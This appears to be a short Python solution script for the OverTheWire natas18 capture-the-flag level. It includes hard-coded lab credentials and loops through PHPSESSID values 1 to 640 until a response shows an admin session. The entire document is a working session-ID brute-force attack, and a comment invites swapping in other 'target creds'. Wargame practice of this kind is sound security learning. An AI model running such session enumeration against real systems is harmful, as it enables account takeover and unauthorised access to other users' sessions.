#!/bin/python3

import requests

url = "http://natas18.natas.labs.overthewire.org/index.php"
auth = ("natas18", "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ") #Replace with target creds

for session_id in range(1, 641):
	cookies = {"PHPSESSID":str(session_id)}
	response = requests.get(url, auth=auth, cookies=cookies)
	
	if "You are an admin" in response.text:
		print(f"Admin session found! PHPSESSID={session_id}")
		print(response.text)
		break
		
		
